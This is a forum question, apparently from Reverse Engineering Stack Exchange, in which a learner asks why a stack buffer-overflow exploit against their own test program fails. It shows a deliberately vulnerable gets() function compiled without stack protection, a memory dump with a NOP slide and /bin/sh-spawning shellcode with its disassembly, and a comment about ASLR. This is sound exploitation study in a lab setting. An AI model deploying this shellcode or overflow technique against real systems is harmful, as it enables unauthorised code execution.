{
    "title": "Bufferoverflow Stack",
    "link": "https://reverseengineering.stackexchange.com/questions/21758/bufferoverflow-stack",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I want to do a buffer overflow exploit in the stack. For this i read in data via the \"gets\"-function.\n </p>\n <pre><code>void ExploitMe()\n{\n  char buffer[256];\n  gets(buffer);\n}\n</code></pre>\n <p>\n  I compile this file with\n </p>\n <pre><code>gcc test.c -o vuln -z execstack -fno-stack-protector\n</code></pre>\n <p>\n  I want to spawn a shell with my bufferoverflow. For this i implemented a nop-slide and put my opcodes to spawn this shell at the end of the nop-slide. After this, I override my return address to an address in my slide.\n Here is my memory:\n </p>\n <p>\n  <code>\n   0x7fffffffde40: 0x90909090 0x90909090  0x90909090  0x90909090\n0x7fffffffde50: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffde60: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffde70: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffde80: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffde90: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffdea0: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffdeb0: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffdec0: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffded0: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffdee0: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffdef0: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffdf00: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffdf10: 0x90909090  0x2fbb4890  0x6e69622f  0x4868732f\n0x7fffffffdf20: 0x5308ebc1  0x50e78948  0xe6894857  0x050f3bb0\n0x7fffffffdf30: 0x42424242  0x42424242  0x42424242  0x42424242\n0x7fffffffdf40: 0x42424242  0x42424242  0xffffdea0  0x00007fff\n  </code>\n </p>\n <p>\n  My return address is 0x00007fffffffdea0, which is an addresss in the middle of the nop-slide.\n </p>\n <p>\n  (I got the opcodes from the following assembler code:\n  \n\n  <code>\n   0000000000000000 <__start>:\n   0:   48 bb 2f 2f 62 69 6e    movabs rbx,0x68732f6e69622f2f\n   7:   2f 73 68 \n   a:   48 c1 eb 08             shr    rbx,0x8\n   e:   53                      push   rbx\n   f:   48 89 e7                mov    rdi,rsp\n  12:   50                      push   rax\n  13:   57                      push   rdi\n  14:   48 89 e6                mov    rsi,rsp\n  17:   b0 3b                   mov    al,0x3b\n  19:   0f 05                   syscall\n  </code>\n  )\n </p>\n <p>\n  \n\n  When i assemble, link and execute the assembler code, i get a shell as wanted.\n </p>\n <p>\n  \n\n  When I step each instruction with gdb, a error occurs\n  <strong>\n   after\n  </strong>\n  the execution of the code to spawn a shell, but no shell is spawned.\n </p>\n <p>\n  When I execute the vulnerable program with the input like seen above outside of gdb, i get a segmentation fault.\n </p>\n <p>\n  Has anybody an idea, why i can't spawn a shell inside or outside of gdb?\n </p>\n <p>\n  I used the following examples:\n </p>\n <p>\n  <a href=\"https://www.youtube.com/watch?v=8QzOC8HfOqU\" rel=\"nofollow noreferrer\">\n   Liveoverflow: youtube\n  </a>\n </p>\n <p>\n  <a href=\"https://www.youtube.com/watch?v=9q1VL8UU8h0\" rel=\"nofollow noreferrer\">\n   Arc Network Security: youtube\n  </a>\n </p>\n <p>\n  I use Ubuntu 16.04 and X86-64.\n </p>\n</div>\n</body></html>",
    "votes": "0",
    "answers": 0,
    "views": "127",
    "tags": [
        "linux",
        "buffer-overflow",
        "stack",
        "x86-64"
    ],
    "user": "AndiYo",
    "time": "Jul 24, 2019 at 14:39",
    "comments": [
        {
            "user": "bart1e",
            "text": "<html><body><span class=\"comment-copy\">\n Have you disabled ASLR so that the stack will be loaded each time at the same location?\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "AndiYo",
            "text": "<html><body><span class=\"comment-copy\">\n I somehow thought ASLR is turned of by compiling with \"-fno-stack-protection\". But ASLR is OS made and has nothing to do with compilers ^^ Thanks @bart1e for the tipp!\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": []
}